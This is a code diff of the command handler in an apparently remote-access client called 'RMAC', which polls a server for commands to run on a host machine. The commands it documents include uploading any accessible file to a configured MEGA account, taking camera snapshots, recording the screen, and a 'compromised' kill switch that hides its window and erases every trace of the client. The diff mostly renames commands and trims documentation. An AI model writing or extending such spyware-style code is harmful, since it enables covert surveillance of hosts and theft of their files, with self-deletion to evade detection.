@@ -9,44 +9,27 @@ import java.util.Objects;
 import lombok.extern.slf4j.Slf4j;
 
 /**
- * Non-blocking process that polls the RMAC Server at a fixed interval for any commands that needs
- * to be executed on the host machine.
+ * Non-blocking process that polls the RMAC API Server at a fixed interval for any commands that
+ * needs to be executed on the host machine.
  * <br><br>
  * Commands:
  * <br>
- * <code>panic</code> : Kill switch that removes all footprints of this client on host machine,
- * including the script doing the removal.
+ * <code>compromised</code> : Kill switch that removes all footprints of this client on host
+ * machine,
+ * including the script performing the removal.
  * <br><br>
- * <code>drive</code> : Enumerates storage drives and their files or directories.
- * <br>
- * Usage:
- * <br>
- * <code>drive list</code> : List all root storage drives.
- * <br>
- * <code>drive tree X</code> : List all files/directories under 'X' drive.
- * <br><br>
- * <code>fetch</code> : Upload any accessible file from host machine.
+ * <code>fetch</code> : Upload any accessible file from this host machine to the configured MEGA
+ * account.
  * <br>
  * Usage:
  * <br>
  * <code>fetch X:\abc\xyz.txt</code>
  * <br><br>
- * <code>system</code> : Control RMAC client
+ * <code>system</code> : Control RMAC Host-client
  * <br>
  * Usage:
  * <br>
- * <code>system shutdown</code> : Stops RMAC client
- * <br><br>
- * <code>process</code> : List/Kill host processes
- * <br>
- * Usage:
- * <br>
- * <code>process list</code> : List all running processes
- * <br>
- * <code>process kill 1837</code> : Kill process with process id 1837
- * <br><br>
- * <code>nircmd</code> : Run nircmd command, see <a
- * href="https://www.nirsoft.net/utils/nircmd.html">nircmd</a>
+ * <code>system shutdown</code> : Stops the RMAC client on this host
  * <br><br>
  * <code>cam</code> : Capture snapshot from camera
  * <br><br>
@@ -54,7 +37,7 @@ import lombok.extern.slf4j.Slf4j;
  * <br>
  * Usage:
  * <br>
- * <code>config VideoDuration 600000</code> : Set screen recording duration to 10 mins
+ * <code>config VideoDuration 600000</code> : Set screen recording duration to 10 minutes.
  */
 @Slf4j
 public class CommandHandler {
@@ -77,7 +60,7 @@ public class CommandHandler {
   }
 
   /**
-   * Execute the commands received from RMAC Server targeted for this client's host.
+   * Execute the commands targeted for this host.
    *
    * @throws IOException when the command cannot be executed or the command fails.
    */
@@ -97,12 +80,12 @@ public class CommandHandler {
           }
         }
         switch (command) {
-          case "panic": {
-            log.info("Command Received: 'panic'");
+          case "compromised": {
+            log.info("Command Received: 'compromised'");
             Runtime.getRuntime().exec(new String[]{
                 "wscript",
                 Constants.SCRIPTS_LOCATION + "\\background.vbs",
-                Constants.SCRIPTS_LOCATION + "\\kill.bat"
+                Constants.SCRIPTS_LOCATION + "\\compromised.bat"
             });
             synchronized (this.thread) {
               this.thread.wait(100);
@@ -190,7 +173,7 @@ public class CommandHandler {
   }
 
   /**
-   * Interrupt the current instance's thread
+   * Interrupt the command handler process.
    */
   public void shutdown() {
     this.thread.interrupt();
